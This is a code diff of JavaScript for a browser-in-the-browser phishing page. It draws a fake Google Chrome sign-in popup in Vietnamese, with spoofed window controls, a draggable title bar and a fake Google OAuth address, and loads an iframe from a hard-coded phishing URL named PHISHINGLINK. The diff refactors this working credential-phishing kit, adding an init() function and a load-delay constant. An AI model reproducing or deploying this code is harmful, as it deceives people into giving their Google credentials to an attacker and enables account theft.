@@ -1,8 +1,3 @@
-var minimize = document.getElementById("minimize");
-var square = document.getElementById("square");
-var exit = document.getElementById("exit");
-var titleBar = document.getElementById("title-bar");
-
 const loadTITLE = "Đăng nhập";
 const TITLE = "Đăng nhập - Tài khoản Google - Google Chrome";
 const loadDOMAINNAME = "";
@@ -12,7 +7,12 @@ const DOMAINPATH = "/o/oauth2/auth/identifier?redirect_uri=storagerelay&%3Fid%3D
 const PHISHINGLINK = "https://www.ltp110.tk/google-login/";
 const loadLOGO = "../loading.gif";
 const LOGO = "../google.svg";
+const loadTIME = 1000;
 
+var minimize = document.getElementById("minimize");
+var square = document.getElementById("square");
+var exit = document.getElementById("exit");
+var titleBar = document.getElementById("title-bar");
 
 ////////////////// Hover listeners //////////////////
 minimize.addEventListener('mouseover', function handleMouseOver() {
@@ -77,15 +77,14 @@ title.on('mousedown', function (e) {
 });
 //////////////// Make window draggable end ////////////////
 
+init();
+document.querySelector("#content").src = PHISHINGLINK;
 
 ////////////////// Onclick listeners //////////////////
 // X button functionality
 $("#exit").click(function () {
   $("#window").css("display", "none");
-  document.querySelector("#logo-description").textContent = loadTITLE;
-  document.querySelector("#domain-name").textContent = loadDOMAINNAME;
-  document.querySelector("#domain-path").textContent = loadDOMAINPATH;
-  document.querySelector("#logo").src = loadLOGO;
+  init();
   $("#content").css("visibility", "hidden");
 });
 
@@ -109,7 +108,7 @@ function enlarge() {
 
 $("#clickme").click(function () {
   $("#window").css("display", "block");
-  setTimeout(loaded, 1000);
+  setTimeout(loaded, loadTIME);
 });
 
 function loaded() {
@@ -120,4 +119,9 @@ function loaded() {
   $("#content").css("visibility", "visible");
 }
 
-document.querySelector("#content").src = PHISHINGLINK;
+function init(){
+  document.querySelector("#logo-description").textContent = loadTITLE;
+  document.querySelector("#domain-name").textContent = loadDOMAINNAME;
+  document.querySelector("#domain-path").textContent = loadDOMAINPATH;
+  document.querySelector("#logo").src = loadLOGO;
+}
